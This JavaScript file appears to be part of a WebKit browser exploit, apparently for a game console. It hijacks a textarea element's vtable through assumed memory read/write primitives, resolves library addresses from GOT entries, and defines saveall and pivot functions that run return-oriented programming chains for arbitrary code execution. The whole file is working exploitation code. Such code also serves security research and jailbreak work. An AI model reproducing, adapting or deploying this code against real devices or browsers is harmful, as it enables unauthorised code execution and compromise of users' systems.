var tarea = document.createElement('textarea');

let real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
let fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);

let real_vtable = read_ptr_at(fake_vt_ptr);
let fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

let fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

let plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx)
{
    let p = plt_ptr + idx * 16;
    let q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    let offset = 0;
    for(let i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
let webkit_base = read_ptr_at(fake_vtable);
let libkernel_base = get_got_addr(705)-0x10000;
let libc_base = get_got_addr(582);
let saveall_addr = libc_base+0x2e2c8;
let loadall_addr = libc_base+0x3275c;
let setjmp_addr = libc_base+0xbfae0;
let longjmp_addr = libc_base+0xbfb30;
let pivot_addr = libc_base+0x327d2;
let infloop_addr = libc_base+0x447a0;
let jop_frame_addr = libc_base+0x715d0;
let get_errno_addr_addr = libkernel_base+0x9ff0;
let pthread_create_addr = libkernel_base+0xf980;

function saveall()
{
    let ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    tarea.scrollLeft = 0;
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    let ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    tarea.scrollLeft = 0;
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
